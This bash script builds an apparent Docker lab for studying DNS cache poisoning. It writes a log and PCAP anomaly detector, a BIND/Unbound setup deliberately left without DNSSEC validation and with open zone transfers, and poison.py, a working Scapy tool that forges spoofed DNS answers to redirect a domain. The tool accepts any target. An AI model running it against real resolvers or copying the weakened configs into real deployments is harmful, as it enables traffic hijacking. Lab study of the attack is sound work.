#!/bin/bash
# Fixed setup script with proper file placement

echo "Creating correct directory structure..."

# Create all necessary directories
mkdir -p backend/api
mkdir -p backend/attack
mkdir -p backend/docker
mkdir -p backend/scripts
mkdir -p backend/measurements
mkdir -p frontend/src/components
mkdir -p frontend/src/services
mkdir -p frontend/public
mkdir -p authoritative/zones
mkdir -p authoritative/keys
mkdir -p resolver/trust-anchors
mkdir -p resolver/logs
mkdir -p attacker
mkdir -p data/pcaps
mkdir -p data/logs
mkdir -p data/results

echo "✓ Directories created"

# ============================================================================
# 1. Create detector.py in the CORRECT location (attacker/ directory)
# ============================================================================
cat > attacker/detector.py << 'EOF'
#!/usr/bin/env python3
"""
Anomaly Detection Script
Analyzes logs and PCAPs for suspicious DNS activity
"""

import re
from collections import defaultdict
from datetime import datetime
import sys

def analyze_logs(log_file):
    """Scan resolver logs for anomalies"""
    print(f"[*] Analyzing log file: {log_file}")
    
    anomalies = []
    query_responses = defaultdict(list)
    
    try:
        with open(log_file, 'r') as f:
            for line in f:
                # Look for multiple responses to same query
                if 'response' in line.lower():
                    match = re.search(r'query.*?(\w+\.\w+)', line)
                    if match:
                        domain = match.group(1)
                        query_responses[domain].append(line)
    except FileNotFoundError:
        print(f"Error: File {log_file} not found")
        return []
    
    # Flag domains with multiple responses
    for domain, responses in query_responses.items():
        if len(responses) > 1:
            anomalies.append({
                'type': 'multiple_responses',
                'domain': domain,
                'count': len(responses),
                'severity': 'high'
            })
    
    return anomalies

def analyze_pcap(pcap_file):
    """Analyze PCAP for forged packets"""
    try:
        from scapy.all import rdpcap, DNS, IP
    except ImportError:
        print("Error: Scapy not installed")
        return []
    
    print(f"[*] Analyzing PCAP: {pcap_file}")
    
    try:
        packets = rdpcap(pcap_file)
    except FileNotFoundError:
        print(f"Error: File {pcap_file} not found")
        return []
    
    dns_responses = []
    
    for pkt in packets:
        if pkt.haslayer(DNS) and pkt[DNS].qr == 1:
            if pkt[DNS].ancount > 0:
                dns_responses.append({
                    'src': pkt[IP].src if pkt.haslayer(IP) else 'unknown',
                    'dst': pkt[IP].dst if pkt.haslayer(IP) else 'unknown',
                    'query': pkt[DNS].qd.qname.decode() if pkt[DNS].qd else 'unknown',
                    'answer': pkt[DNS].an.rdata if pkt[DNS].an else None
                })
    
    # Group by query
    query_groups = defaultdict(list)
    for resp in dns_responses:
        query_groups[resp['query']].append(resp)
    
    # Find duplicate responses
    anomalies = []
    for query, responses in query_groups.items():
        if len(responses) > 1:
            unique_ips = set(r['answer'] for r in responses if r['answer'])
            if len(unique_ips) > 1:
                anomalies.append({
                    'type': 'conflicting_responses',
                    'query': query,
                    'ips': list(unique_ips),
                    'severity': 'critical'
                })
    
    return anomalies

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: detector.py <log_file|pcap_file>")
        sys.exit(1)
    
    file_path = sys.argv[1]
    
    if file_path.endswith('.pcap'):
        anomalies = analyze_pcap(file_path)
    else:
        anomalies = analyze_logs(file_path)
    
    print(f"\n[*] Detection Results:")
    print(f"    Found {len(anomalies)} anomalies\n")
    
    for i, anomaly in enumerate(anomalies, 1):
        print(f"[{i}] {anomaly['type'].upper()}")
        for key, value in anomaly.items():
            if key != 'type':
                print(f"    {key}: {value}")
        print()
EOF

chmod +x attacker/detector.py

# ============================================================================
# 2. Create poison.py in attacker/ directory
# ============================================================================
cat > attacker/poison.py << 'EOF'
#!/usr/bin/env python3
"""
DNS Cache Poisoning Attack Script
Uses Scapy to forge DNS responses and poison resolver cache
"""

from scapy.all import *
import argparse
import json
import time
import random
from datetime import datetime

# Attack metrics
metrics = {
    "poison_attempts": 0,
    "successful_poisons": 0,
    "blocked_attempts": 0,
    "avg_latency_ms": 0,
    "success_rate": 0,
    "start_time": None
}

# Target configuration
TARGET_RESOLVER = "10.0.0.53"
AUTHORITATIVE_SERVER = "10.0.1.10"
MALICIOUS_IP = "192.168.100.100"
TARGET_DOMAIN = "example.local"

def save_metrics():
    """Save metrics to JSON file"""
    if metrics["poison_attempts"] > 0:
        metrics["success_rate"] = round(
            (metrics["successful_poisons"] / metrics["poison_attempts"]) * 100, 2
        )
    
    with open('/tmp/attack_metrics.json', 'w') as f:
        json.dump(metrics, f, indent=2)

def check_poison_success(target_resolver, domain):
    """
    Query resolver to check if poisoning succeeded
    Returns True if cache contains malicious IP
    """
    try:
        query = IP(dst=target_resolver)/UDP(dport=53)/DNS(
            rd=1, qd=DNSQR(qname=domain, qtype='A')
        )
        response = sr1(query, timeout=2, verbose=0)
        
        if response and response.haslayer(DNS):
            if response[DNS].an:
                answer_ip = response[DNS].an.rdata
                return answer_ip == MALICIOUS_IP
    except:
        pass
    return False

def poison_attack(target_resolver, domain, malicious_ip):
    """
    Perform DNS cache poisoning attack
    Sniffs for queries and races to inject forged response
    """
    print(f"[*] Starting DNS cache poisoning attack")
    print(f"[*] Target Resolver: {target_resolver}")
    print(f"[*] Target Domain: {domain}")
    print(f"[*] Malicious IP: {malicious_ip}")
    print(f"[*] Waiting for DNS queries...\n")
    
    metrics["start_time"] = datetime.now().isoformat()
    
    def poison_response(pkt):
        """Callback function to forge DNS response"""
        if pkt.haslayer(DNS) and pkt[DNS].qr == 0:  # DNS Query
            query_name = pkt[DNS].qd.qname.decode()
            
            if domain in query_name:
                metrics["poison_attempts"] += 1
                
                # Extract query parameters
                query_id = pkt[DNS].id
                src_ip = pkt[IP].src
                src_port = pkt[UDP].sport
                
                print(f"[+] Query detected! ID: {query_id}, From: {src_ip}:{src_port}")
                
                # Craft forged response
                forged_response = IP(dst=src_ip, src=AUTHORITATIVE_SERVER) / \
                                UDP(dport=src_port, sport=53) / \
                                DNS(
                                    id=query_id,
                                    qr=1,  # Response
                                    aa=1,  # Authoritative
                                    rd=0,
                                    ra=0,
                                    qd=DNSQR(qname=query_name),
                                    an=DNSRR(
                                        rrname=query_name,
                                        type='A',
                                        rdata=malicious_ip,
                                        ttl=300
                                    )
                                )
                
                # Send forged response multiple times to win the race
                for i in range(5):
                    send(forged_response, verbose=0)
                    time.sleep(0.001)
                
                print(f"[!] Forged response sent: {query_name} -> {malicious_ip}")
                
                # Wait a moment then check if poisoning succeeded
                time.sleep(0.5)
                if check_poison_success(target_resolver, domain):
                    metrics["successful_poisons"] += 1
                    print(f"[✓] POISONING SUCCESSFUL! Cache now contains {malicious_ip}")
                else:
                    metrics["blocked_attempts"] += 1
                    print(f"[✗] Poisoning blocked (likely DNSSEC validation)")
                
                save_metrics()
                print(f"    Stats: {metrics['successful_poisons']}/{metrics['poison_attempts']} successful\n")
    
    # Sniff DNS traffic on resolver interface
    try:
        sniff(
            filter=f"udp port 53",
            prn=poison_response,
            store=0
        )
    except KeyboardInterrupt:
        print("\n[*] Attack stopped by user")
        save_metrics()

def main():
    parser = argparse.ArgumentParser(description='DNS Cache Poisoning Attack Tool')
    parser.add_argument('--target', default=TARGET_RESOLVER, help='Target resolver IP')
    parser.add_argument('--domain', default=TARGET_DOMAIN, help='Domain to poison')
    parser.add_argument('--malicious-ip', default=MALICIOUS_IP, help='Malicious IP to inject')
    
    args = parser.parse_args()
    
    print("="*60)
    print("DNS CACHE POISONING ATTACK TOOL")
    print("Educational Use Only - Isolated Lab Environment")
    print("="*60 + "\n")
    
    poison_attack(args.target, args.domain, args.malicious_ip)

if __name__ == '__main__':
    main()
EOF

chmod +x attacker/poison.py

# ============================================================================
# 3. Fixed Attacker Dockerfile (simpler, no missing files)
# ============================================================================
cat > attacker/Dockerfile << 'EOF'
FROM python:3.11-slim

# Install system dependencies
RUN apt-get update && apt-get install -y \
    tcpdump \
    dnsutils \
    net-tools \
    iputils-ping \
    && rm -rf /var/lib/apt/lists/*

# Install Python packages
RUN pip install --no-cache-dir \
    scapy \
    dnspython \
    requests

# Create app directory
WORKDIR /app

# Copy attack scripts (these will be mounted, but copy for backup)
# COPY poison.py /app/
# COPY detector.py /app/

# Keep container running
CMD ["tail", "-f", "/dev/null"]
EOF

# ============================================================================
# 4. Fixed docker-compose.yml with volume mounts instead of COPY
# ============================================================================
cat > docker-compose.yml << 'EOF'
version: '3.8'

services:
  # Authoritative DNS Server (BIND9)
  authoritative_dns:
    image: ubuntu/bind9:latest
    container_name: authoritative_dns
    hostname: authoritative
    networks:
      dns_lab:
        ipv4_address: 10.0.1.10
    volumes:
      - ./authoritative/named.conf:/etc/bind/named.conf:ro
      - ./authoritative/zones:/etc/bind/zones:ro
      - ./authoritative/keys:/etc/bind/keys:ro
    command: ["named", "-g", "-c", "/etc/bind/named.conf"]
    restart: unless-stopped

  # Caching Resolver (Unbound)
  resolver_dns:
    image: klutchell/unbound:latest
    container_name: resolver_dns
    hostname: resolver
    networks:
      dns_lab:
        ipv4_address: 10.0.0.53
    volumes:
      - ./resolver:/etc/unbound:rw
      - ./resolver/logs:/var/log:rw
    cap_add:
      - NET_ADMIN
    restart: unless-stopped

  # Attacker Container
  attacker:
    build:
      context: ./attacker
      dockerfile: Dockerfile
    container_name: attacker
    hostname: attacker
    networks:
      dns_lab:
        ipv4_address: 10.0.2.100
    volumes:
      - ./attacker:/app:rw
      - ./data/pcaps:/pcaps:rw
    cap_add:
      - NET_ADMIN
      - NET_RAW
    command: tail -f /dev/null
    restart: unless-stopped

networks:
  dns_lab:
    driver: bridge
    ipam:
      config:
        - subnet: 10.0.0.0/16
    driver_opts:
      com.docker.network.bridge.name: dns_lab_br
EOF

# ============================================================================
# 5. Create basic config files
# ============================================================================

# BIND Configuration
cat > authoritative/named.conf << 'EOF'
options {
    directory "/var/cache/bind";
    listen-on { any; };
    allow-query { any; };
    recursion no;
    dnssec-validation no;
};

zone "example.local" {
    type master;
    file "/etc/bind/zones/example.local.zone";
    allow-transfer { any; };
};
EOF

# Zone file
cat > authoritative/zones/example.local.zone << 'EOF'
$TTL 300
@       IN  SOA     ns1.example.local. admin.example.local. (
                    2024111901
                    3600
                    1800
                    604800
                    300 )

@       IN  NS      ns1.example.local.
ns1     IN  A       10.0.1.10
www     IN  A       10.0.1.20
@       IN  A       10.0.1.10
EOF

# Unbound basic config
cat > resolver/unbound.conf << 'EOF'
server:
    verbosity: 2
    interface: 0.0.0.0
    port: 53
    do-ip4: yes
    do-ip6: no
    do-udp: yes
    do-tcp: yes
    
    access-control: 10.0.0.0/16 allow
    access-control: 127.0.0.0/8 allow
    
    module-config: "iterator"
    
    logfile: "/var/log/unbound.log"
    log-queries: yes
    log-replies: yes

forward-zone:
    name: "example.local"
    forward-addr: 10.0.1.10@53
EOF

echo ""
echo "✓ All files created successfully!"
echo ""
echo "File structure:"
echo "  attacker/Dockerfile"
echo "  attacker/poison.py"
echo "  attacker/detector.py"
echo "  docker-compose.yml"
echo "  authoritative/named.conf"
echo "  authoritative/zones/example.local.zone"
echo "  resolver/unbound.conf"
echo ""
echo "Now run:"
echo "  docker-compose build"
echo "  docker-compose up -d"